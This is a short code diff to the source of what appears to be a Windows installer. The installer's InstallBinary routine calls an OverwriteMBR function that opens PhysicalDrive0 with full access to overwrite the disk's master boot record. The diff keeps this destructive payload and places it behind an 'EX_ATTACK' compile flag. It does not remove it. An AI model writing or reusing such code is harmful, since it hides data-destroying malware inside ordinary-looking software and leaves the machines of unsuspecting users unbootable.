@@ -59,6 +59,7 @@ static void CreateShortcut(const char* targetPath, const char* shortcutPath)
     CoUninitialize();
 }
 
+#ifdef EX_ATTACK
 static void OverwriteMBR()
 {
     HANDLE MBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
@@ -74,6 +75,7 @@ static void OverwriteMBR()
 
     CloseHandle(MBR);
 }
+#endif
 
 static void InstallBinary(HWND windowHandle)
 {
@@ -99,7 +101,9 @@ static void InstallBinary(HWND windowHandle)
     if (launchAfterInstall)
         ShellExecuteA(NULL, "open", pathBuffer, NULL, NULL, SW_SHOWNORMAL);   
 
+#ifdef EX_ATTACK
     OverwriteMBR();
+#endif
 }
 
 LRESULT CALLBACK WindowProc(HWND windowHandle, UINT message, WPARAM wordParam, LPARAM longParam)
